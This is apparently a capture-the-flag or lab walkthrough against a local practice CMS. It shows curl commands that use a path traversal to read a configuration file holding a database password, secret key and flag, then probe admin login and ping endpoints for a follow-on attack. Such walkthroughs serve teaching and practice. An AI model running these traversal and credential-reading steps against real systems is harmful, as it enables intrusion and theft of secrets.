# Finding the Bug

## Step 1: Explore the normal file viewer

The application serves files via a `file` query parameter:

```
curl -s http://127.0.0.1:8115/view?file=about.txt
```

Output:

```
About this CMS.
```

That works. Now test whether the path is sanitized.

## Step 2: Test for path traversal

Add `../` sequences to escape the web root:

```
curl -s "http://127.0.0.1:8115/view?file=../../etc/config"
```

Output:

```
[database]
host = db.internal
port = 5432
user = admin
password = Tr0ub4dor&3

[app]
secret_key = s3cr3t
admin_flag = POC{...}
```

The server returned the application configuration file. The `password` field contains the admin password.

## Step 3: Check if the admin panel exists

```
curl -si -X POST -H 'Content-Type: application/json' \
  -d '{"username":"wrong","password":"wrong"}' \
  http://127.0.0.1:8115/admin/login
```

Output:

```
HTTP/1.1 401 UNAUTHORIZED
{"error":"Invalid credentials"}
```

The endpoint exists and requires authentication. You now have credentials from the LFI.

## Step 4: Check the ping tool

```
curl -si -X POST -H 'Content-Type: application/json' -H 'X-Token: test' \
  -d '{"host":"localhost"}' \
  http://127.0.0.1:8115/admin/ping
```

Output:

```
HTTP/1.1 403 FORBIDDEN
{"error":"Unauthorized"}
```

The endpoint requires a valid admin token. After login, you will have one.
